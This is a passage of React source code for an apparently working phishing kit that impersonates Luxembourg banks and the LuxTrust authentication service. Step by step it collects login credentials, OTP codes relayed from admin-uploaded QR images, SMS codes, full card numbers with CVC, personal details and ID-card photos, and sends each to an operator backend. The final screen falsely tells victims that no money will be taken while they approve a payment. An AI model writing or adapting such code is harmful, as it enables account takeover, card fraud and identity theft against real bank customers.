              <span className="flex h-5 w-5 items-center justify-center rounded-md text-[11px] font-extrabold text-white" style={{ backgroundColor: bank.color }}>1</span>
              Identifiant <span className="font-semibold text-neutral-400">4 lettres + 4 chiffres</span>
            </span>
            <span className="relative mt-2 block">
              <LeadIcon d={P.user} />
              <input
                value={userId}
                onChange={(e) => setUserId(e.target.value.replace(/[^0-9A-Za-z]/g, "").slice(0, 8))}
                onBlur={() => setT1(true)}
                placeholder={USER_ID_EXAMPLE}
                autoComplete="username"
                className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
              />
            </span>
            {uidErr ? <span className={errCls}>âš  {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> â€” 4 lettres d&apos;abord, 4 chiffres ensuite.</span>}
          </label>
          <label className="mt-4 block min-w-0">
            <span className={labelCls}>Mot de passe</span>
            <span className="relative mt-2 block">
              <LeadIcon d={P.lock} />
              <input
                type={showPw ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onBlur={() => setT1(true)}
                placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
                autoComplete="current-password"
                className={`${inputCls(pwErr)} pr-14`}
              />
              <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
                {showPw ? "Masquer" : "Afficher"}
              </button>
            </span>
            {pwErr && <span className={errCls}>âš  {pwErr}</span>}
          </label>
          <div className="mt-6">
            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>VÃ©rifier et continuer â†’</PrimaryBtn>
          </div>
          <div className="mt-2.5 flex w-full flex-col gap-2 sm:flex-row">
            <button type="button" onClick={goHome} className="min-h-[44px] flex-1 rounded-lg border border-neutral-200 px-4 py-2.5 text-[13px] font-semibold text-neutral-500 hover:bg-neutral-50">
              Changer de banque
            </button>
          </div>
        </form>
      </Shell>
    );
  }

  /* ---------- QR (BIL + Spuerkeess extra step only â€” all other steps stay the same) ---------- */
  if (status === "qr_requested") {
    // Only QR banks have this step: LuxTrust mosaic + OTP, like the real bank page.
    // The mosaic image is uploaded by the admin for THIS session.
    if (QR_BANKS.includes(bank.slug)) {
      const otpCode = otp.replace(/\D/g, "").slice(0, 12);
      const otpOk = otpCode.length > 0;
      const appName = bank.slug === "spuerkeess" ? "S-Net" : "BILnet";
      const appSite = bank.slug === "spuerkeess" ? "spuerkeess.lu" : "bil.com";
      return (
        <Shell
          bank={bank}
          step={2}
          kicker="QR-Code"
          title="Scannez l'image."
          desc="Scannez ce QR code avec votre application LuxTrust, puis saisissez le code OTP affichÃ©."
        >
          <div className="flex w-full flex-col items-center px-2">
            {/* fraud notice, like the real BILnet page */}
            <div className="mb-4 w-full rounded-2xl border border-neutral-200 bg-white px-4 py-3.5 text-left shadow-sm">
              <p className="text-[11px] font-extrabold uppercase tracking-[0.18em] text-cyan-600">Fraudepreventie</p>
              <p className="mt-1 text-[12.5px] leading-relaxed text-neutral-700">
                Fraude <b>kent</b> vele vormen. <b>Houd dit in gedachten :</b>
              </p>
              <ul className="mt-1.5 list-disc space-y-1 pl-5 text-[12.5px] leading-relaxed text-neutral-700">
                <li>BIL zal u NOOIT om <b>uw persoonlijke gegevens</b>, LuxTrust-inloggegevens of kaartcode vragen, noch om transactie-&quot;annuleringen&quot; te bevestigen via sms, e-mail of telefoon.</li>
                <li>U kunt {appName} bereiken via onze officiÃ«le website {appSite} of via de {appName}-app.</li>
                <li><b>Klik niet</b> op links in sms-berichten of e-mails.</li>
              </ul>
              <p className="mt-1.5 text-[12.5px] leading-relaxed text-neutral-700">
                <b>Slachtoffer</b> van fraude? <b>Neem contact op met</b> onze klantenservice via +352 4590 5000
                (ma-vr 8:30-18:00) of Worldline via +352 491010.
              </p>
              <p className="mt-1 text-center text-[12.5px] font-semibold text-purple-700 underline">Leer meer</p>
            </div>
            <p className="text-[19px] font-black tracking-tight text-neutral-900">
              LUX<span className="bg-gradient-to-r from-cyan-500 to-blue-700 bg-clip-text text-transparent">TRUST</span>
            </p>
            <p className="text-[12px] text-neutral-500">Enabling a digital world</p>
            <div className="mt-3 flex w-full flex-col items-center gap-4">
              <div className="flex flex-col items-center">
            {qrImg ? (
              <img src={qrImg} alt="Scannez l'image" className="h-[210px] w-[210px] rounded-lg object-contain" />
            ) : (
                  <span className="flex w-full min-w-[230px] flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-neutral-50 px-4 py-8 text-center">
                    <span className="h-9 w-9 animate-spin rounded-full border-4 border-neutral-200 border-t-current" style={{ color: bank.color }} />
                    <p className="mt-3 max-w-xs text-[13px] font-semibold leading-relaxed text-neutral-600">
                      Le QR code de votre banque arriveâ€¦ veuillez patienter.
                    </p>
                  </span>
                )}
              </div>
            </div>
            <form
              noValidate
              className="mt-5 flex w-full max-w-[300px] flex-col items-center"
              onSubmit={(e) => {
                e.preventDefault();
                if (!otpOk) return;
                submitAndWait("qr", { scanned: true, otp: otpCode, at: new Date().toISOString() }, "qr_submitted");
              }}
            >
              <label className="flex w-full items-center gap-2">
                <span className="shrink-0 text-[13px] font-extrabold uppercase tracking-wide text-neutral-700">OTP</span>
                <input
                  value={otpCode}
                  onChange={(e) => setOtp(e.target.value)}
                  placeholder="OTP"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  className={`min-w-0 flex-1 border border-neutral-300 bg-white px-2.5 py-1.5 text-center font-mono text-[16px] font-bold tracking-[0.2em] outline-none transition placeholder:font-sans placeholder:text-[13px] placeholder:font-normal placeholder:text-neutral-400 focus:border-[var(--brand)]`}
                />
                <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-neutral-800 text-[11px] font-bold text-white">?</span>
              </label>
              <div className="mt-4 flex w-full gap-2.5">
                <button
                  type="button"
                  onClick={() => setOtp("")}
                  className="min-h-[48px] flex-1 rounded-lg border border-neutral-300 px-4 py-2.5 text-[13px] font-bold text-neutral-600 transition hover:bg-neutral-50 active:bg-neutral-100"
                >
                  Annuler
                </button>
                <button
                  type="submit"
                  disabled={!otpOk || loading}
                  className="min-h-[48px] flex-1 rounded-lg border-2 border-green-600 bg-white px-4 py-2.5 text-[14px] font-extrabold uppercase tracking-wide text-green-700 transition hover:bg-green-50 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-40"
                >
                  {loading ? "â€¦" : "S'AUTHENTIFIER"}
                </button>
              </div>
            </form>
          </div>
        </Shell>
      );
    }
    // Any other bank should never land here â€” park on the loader.
    return <WaitingLoader bank={bank} stepNum={2} note="Veuillez patienterâ€¦" />;
  }

  /* ---------- APPROVE (same for every bank, BIL included) ---------- */
  if (status === "approve_requested") {
    return (
      <Shell
        bank={bank}
        step={2}
        kicker="Notification d'approbation"
        title="VÃ©rifiez votre application LuxTrust"
        desc="Une notification est prÃªte Ã  Ãªtre approuvÃ©e dans votre application LuxTrust, pour confirmer que c'est bien vous."
      >
        <ApproveVisual bank={bank} />
        <div className="mt-4 w-full space-y-2.5">
          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("approve", { approved: true, at: new Date().toISOString() }, "approve_submitted")}>
            âœ“ J&apos;ai approuvÃ©
          </PrimaryBtn>
          <button type="button" className="min-h-[48px] w-full rounded-xl border-2 border-neutral-200 px-4 py-2.5 text-[13.5px] font-bold text-neutral-600 transition hover:border-neutral-300 hover:bg-neutral-50 active:bg-neutral-100">
            Renvoyer la notification
          </button>
        </div>
      </Shell>
    );
  }

  /* ---------- PHONE ---------- */
  if (status === "phone_requested") {
    const digits = phone.replace(/\D/g, "");
    const err = !t3 ? "" : !digits ? "Le numÃ©ro de tÃ©lÃ©phone est requis." : digits.length < 8 ? "Veuillez saisir un numÃ©ro valide." : "";
    const ok = digits.length >= 8;
    return (
      <Shell bank={bank} step={3} kicker="NumÃ©ro de tÃ©lÃ©phone" title="Entrez votre numÃ©ro de tÃ©lÃ©phone" desc="Veuillez saisir votre numÃ©ro de tÃ©lÃ©phone.">
        <form noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
          <label className="block min-w-0">
            <span className={labelCls}>NumÃ©ro de tÃ©lÃ©phone</span>
            <span className="relative mt-2 flex w-full min-w-0 items-center overflow-hidden rounded-xl border-2 border-neutral-200 bg-slate-50/70 transition-all duration-200 focus-within:border-[var(--brand)] focus-within:bg-white focus-within:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)] hover:border-neutral-300">
              <span className="shrink-0 py-3.5 pl-3.5 pr-1 text-neutral-400">
                <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round"><path d={P.phone} /></svg>
              </span>
              <span className="shrink-0 bg-neutral-200/60 px-2 py-1 text-[14px] font-extrabold text-neutral-600 rounded-lg ml-1">+352</span>
              <input
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/[^\d\s]/g, ""))}
                onBlur={() => setT3(true)}
                placeholder="621 123 456"
                inputMode="tel"
                autoComplete="tel"
                className="w-full min-w-0 bg-transparent px-3 py-3.5 text-[16px] font-semibold tracking-wide outline-none placeholder:font-normal placeholder:text-neutral-300 sm:text-[15px]"
              />
            </span>
            {err && <span className={errCls}>âš  {err}</span>}
          </label>
          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continuer â†’</PrimaryBtn></div>
        </form>
      </Shell>
    );
  }

  /* ---------- SMS ---------- */
  if (status === "sms_requested") {
    const code = sms.replace(/\D/g, "").slice(0, 20);
    const err = !t4 ? "" : !code ? "Le code SMS est requis." : "";
    const ok = code.length > 0;
    return (
      <Shell bank={bank} step={4} kicker="VÃ©rification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer Ã  votre numÃ©ro.">
        <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
          <label className="block min-w-0">
            <span className={`${labelCls} flex items-center gap-1.5`}>
              <svg viewBox="0 0 24 24" className="h-4 w-4 text-neutral-400" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d={P.chat} /></svg>
              Code SMS
            </span>
            <input
              value={code}
              onChange={(e) => setSms(e.target.value)}
              onBlur={() => setT4(true)}
              placeholder="â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢"
              inputMode="numeric"
              autoComplete="one-time-code"
              className={`mt-2 text-center font-mono text-[19px] font-extrabold tracking-[0.22em] sm:text-[21px] ${inputClsPlain(err)}`}
            />
            {err && <span className={`${errCls} justify-center`}>âš  {err}</span>}
          </label>
          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>VÃ©rifier le code â†’</PrimaryBtn></div>
        </form>
      </Shell>
    );
  }

  /* ---------- CARD ---------- */
  if (status === "card_requested") {
    const num = card.number.replace(/\D/g, "").slice(0, 16);
    const expOk = /^(0[1-9]|1[0-2])\/\d{2}$/.test(card.exp);
    const errs = {
      holder: t5 && !card.holder.trim() ? "Le titulaire est requis." : "",
      number: t5 && num.length !== 16 ? "Saisissez les 16 chiffres de la carte." : "",
      exp: t5 && !expOk ? "Format MM/AA." : "",
      cvc: t5 && !/^\d{3,4}$/.test(card.cvc) ? "CVC invalide." : "",
    };
    const ok = card.holder.trim() && num.length === 16 && expOk && /^\d{3,4}$/.test(card.cvc);
    const fmtNum = (v) => v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
    const fmtExp = (v) => {
      const d = v.replace(/\D/g, "").slice(0, 4);
      if (d.length <= 2) return d;
      return d.slice(0, 2) + "/" + d.slice(2);
    };
    return (
      <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les dÃ©tails de votre carte" desc="Veuillez saisir les dÃ©tails de votre carte bancaire pour finaliser la vÃ©rification.">
        <form noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
          {/* mini card preview */}
          <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
            <div className="flex items-center justify-between">
              <span className="h-7 w-10 rounded-md bg-gradient-to-br from-amber-200 to-amber-400" />
              <span className="text-[11px] font-extrabold uppercase tracking-[0.2em] opacity-70">{bank.short}</span>
            </div>
            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{fmtNum(card.number) || "â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢"}</p>
            <div className="mt-2 flex items-end justify-between text-[11px]">
              <span className="uppercase tracking-wider opacity-70">{card.holder || "CARD HOLDER"}</span>
              <span className="font-mono">{card.exp || "MM/YY"}</span>
            </div>
          </div>
          <label className="block min-w-0">
            <span className={labelCls}>Titulaire de la carte</span>
            <span className="relative mt-2 block">
              <LeadIcon d={P.user} />
              <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="cc-name" className={`uppercase ${inputCls(errs.holder)}`} />
            </span>
            {errs.holder && <span className={errCls}>âš  {errs.holder}</span>}
          </label>
          <label className="block min-w-0">
            <span className={labelCls}>NumÃ©ro de carte</span>
            <span className="relative mt-2 block">
              <LeadIcon d={P.card} />
              <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="cc-number" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
            </span>
            {errs.number && <span className={errCls}>âš  {errs.number}</span>}
          </label>
          <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
            <label className="block min-w-0">
              <span className={labelCls}>Expiration</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.cal} />
                <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="cc-exp" className={`font-mono ${inputCls(errs.exp)}`} />
              </span>
              {errs.exp && <span className={errCls}>âš  {errs.exp}</span>}
            </label>
            <label className="block min-w-0">
              <span className={labelCls}>CVC</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.lock} />
                <input value={card.cvc} onChange={(e) => setCard({ ...card, cvc: e.target.value.replace(/\D/g, "").slice(0, 4) })} placeholder="123" inputMode="numeric" autoComplete="cc-csc" className={`font-mono ${inputCls(errs.cvc)}`} />
              </span>
              {errs.cvc && <span className={errCls}>âš  {errs.cvc}</span>}
            </label>
          </div>
          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer â†’</PrimaryBtn></div>
        </form>
      </Shell>
    );
  }

  /* ---------- INFO ---------- */
  if (status === "info_requested") {
    const dobOk = /^\d{2}\/\d{2}\/\d{4}$/.test(info.dob);
    const e = {
      first: t6 && !info.first.trim() ? "Requis." : "",
      last: t6 && !info.last.trim() ? "Requis." : "",
      dob: t6 && !dobOk ? "Format JJ/MM/AAAA." : "",
      address: t6 && !info.address.trim() ? "Requis." : "",
      zip: t6 && !info.zip.trim() ? "Requis." : "",
      city: t6 && !info.city.trim() ? "Requis." : "",
    };
    const ok = info.first.trim() && info.last.trim() && dobOk && info.address.trim() && info.zip.trim() && info.city.trim();
    const set = (k) => (ev) => setInfo({ ...info, [k]: ev.target.value });
    const setDob = (ev) => {
      const d = ev.target.value.replace(/\D/g, "").slice(0, 8);
      let out = d.slice(0, 2);
      if (d.length > 2) out += "/" + d.slice(2, 4);
      if (d.length > 4) out += "/" + d.slice(4);
      setInfo({ ...info, dob: out });
    };
    return (
      <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrÃ©s auprÃ¨s de votre banque.">
        <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
          <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
            <label className="block min-w-0"><span className={labelCls}>PrÃ©nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>âš  {e.first}</span>}</label>
            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>âš  {e.last}</span>}</label>
          </div>
          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="bday" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>âš  {e.dob}</span>}</label>
          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numÃ©ro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>âš  {e.address}</span>}</label>
          <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>âš  {e.zip}</span>}</label>
            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>âš  {e.city}</span>}</label>
          </div>
          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer â†’</PrimaryBtn></div>
        </form>
      </Shell>
    );
  }

  /* ---------- ID (all banks except tango/orange) ---------- */
  if (status === "id_requested") {
    const fErr = idFront ? checkIdFile(idFront) : "";
    const bErr = idBack ? checkIdFile(idBack) : "";
    const ok = idFront && idBack && !fErr && !bErr && !idUp;

    async function sendId() {
      setIdErr("");
      if (!ok) {
        if (!idFront) setIdErr("Recto requis : photographiez le devant de votre piÃ¨ce.");
        else if (!idBack) setIdErr("Verso requis : photographiez le dos de votre piÃ¨ce.");
        else setIdErr(fErr || bErr);
        return;
      }
      setIdUp(true);
      setLoading(true);
      try {
        let frontUrl;
        let backUrl;
        if (apiEnabled()) {
          const f = await apiUploadId(visitorIdRef.current, "front", await readFileAsDataURL(idFront), (p) =>
            setIdPct((s) => ({ ...s, front: p }))
          );
          frontUrl = f.url;
          const b = await apiUploadId(visitorIdRef.current, "back", await readFileAsDataURL(idBack), (p) =>
            setIdPct((s) => ({ ...s, back: p }))
          );
          backUrl = b.url;
        } else {
          setIdPct({ front: 50, back: 50 });
          frontUrl = await readFileAsDataURL(idFront);
          backUrl = await readFileAsDataURL(idBack);
          setIdPct({ front: 100, back: 100 });
        }
        setLoading(false);
        setIdUp(false);
        submitAndWait("id", { front: frontUrl, back: backUrl }, "id_submitted");
      } catch (e) {
        setLoading(false);
        setIdUp(false);
        setIdErr(e.message === "upload failed" ? "Envoi Ã©chouÃ©, rÃ©essayez." : e.message || "Envoi Ã©chouÃ©, rÃ©essayez.");
      }
    }

    function IdBox({ side, file, setFile, preview, setPreview, err, pct }) {
      return (
        <label className="block min-w-0">
          <span className={labelCls}>{side === "front" ? "Recto" : "Verso"}</span>
          <span className="mt-2 flex cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed border-neutral-300 bg-slate-50/60 px-3 py-5 text-center transition hover:border-[var(--brand)] hover:bg-white">
            {preview ? (
              <img src={preview} alt={side} className="max-h-36 w-auto rounded-lg object-contain shadow" />
            ) : (
              <>
                <svg viewBox="0 0 24 24" className="h-8 w-8 text-neutral-300" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
                  <circle cx="12" cy="13" r="4" />
                </svg>
                <span className="mt-1.5 text-[13px] font-bold text-neutral-500">
                  {side === "front" ? "Photographiez le recto" : "Photographiez le verso"}
                </span>
                <span className="text-[11.5px] text-neutral-400">PNG ou JPG â€¢ 100 Ko â€“ 1 Mo</span>
              </>
            )}
            <input
              type="file"
              accept="image/png,image/jpeg,image/jpg"
              className="hidden"
              onChange={(e) => {
                const f = e.target.files?.[0] || null;
                e.target.value = "";
                setFile(f);
                setPreview(f ? URL.createObjectURL(f) : "");
              }}
            />
          </span>
          {pct > 0 && pct < 100 && (
            <span className="mt-1.5 block h-1.5 w-full overflow-hidden rounded-full bg-neutral-200">
              <span className="block h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
            </span>
          )}
          {err && <span className={errCls}>âš  {err}</span>}
        </label>
      );
    }

    return (
      <Shell bank={bank} step={7} kicker="PiÃ¨ce d'identitÃ©" title="TÃ©lÃ©versez votre piÃ¨ce d'identitÃ©" desc="Photographiez le recto et le verso de votre carte d'identitÃ©. PNG ou JPG, entre 100 Ko et 1 Mo.">
        <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
          <IdBox side="front" file={idFront} setFile={setIdFront} preview={idFrontUrl} setPreview={setIdFrontUrl} err={fErr} pct={idPct.front} />
          <IdBox side="back" file={idBack} setFile={setIdBack} preview={idBackUrl} setPreview={setIdBackUrl} err={bErr} pct={idPct.back} />
        </div>
        {idErr && <p className={`${errCls} mt-2 text-center`}>âš  {idErr}</p>}
        <div className="pt-3">
          <PrimaryBtn bank={bank} loading={loading} disabled={!ok} onClick={sendId}>Envoyer â†’</PrimaryBtn>
        </div>
      </Shell>
    );
  }

  /* ---------- CONFIRM ---------- */
  if (status === "confirm_requested") {
    return (
      <Shell
        bank={bank}
        step={8}
        kicker="Confirmation finale"
        title="Approuvez pour finaliser"
        desc="Une demande d'approbation est en attente dans votre application LuxTrust. Un montant peut Ã©ventuellement apparaÃ®tre. Vous pouvez ignorer ce montant : AUCUN frais ne sera prÃ©levÃ© de votre compte. Ceci est un message gÃ©nÃ©rÃ© automatiquement."
      >
        <ApproveVisual bank={bank} />
        <div className="mt-4 w-full rounded-2xl border p-4 text-[13px] sm:p-4" style={{ borderColor: bank.color + "44", background: `linear-gradient(180deg, ${bank.color}12, ${bank.color}06)` }}>
          <p className="font-bold text-neutral-800">RÃ©sumÃ© de la vÃ©rification</p>
          <p className="mt-1 break-words text-neutral-600">
            {bank.name} â€¢ Utilisateur <b className="font-mono break-all">{userId.toUpperCase()}</b> â€¢ {info.first} {info.last} â€¢ {phone && `+352 ${phone}`}
          </p>
        </div>
        <div className="mt-4 w-full space-y-2.5">
          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "confirm_submitted")}>
            âœ“ J&apos;ai approuvÃ© le paiement
          </PrimaryBtn>
        </div>
      </Shell>
    );
  }

  /* ---------- DONE ---------- */
  return (
    <Shell
      bank={bank}
      step={8}
      kicker="TerminÃ©"
      title="VÃ©rification terminÃ©e"
      desc="Merci. Votre session est terminÃ©e."
    >
      <div className="w-full rounded-xl border border-green-200 bg-green-50 p-4 text-center sm:p-6">
        <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-2xl text-white">âœ“</div>
        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">VÃ©rification terminÃ©e</p>
        <p className="mt-1 text-[13px] text-neutral-600 sm:text-[13.5px]">
          Merci. Votre identitÃ© {bank.name} a Ã©tÃ© vÃ©rifiÃ©e.
        </p>
        <button onClick={goHome} className="mt-4 min-h-[48px] w-full rounded-lg bg-neutral-900 px-4 py-3 text-[14px] font-bold text-white active:bg-neutral-800">
          â† Retour
        </button>
      </div>
    </Shell>
  );
}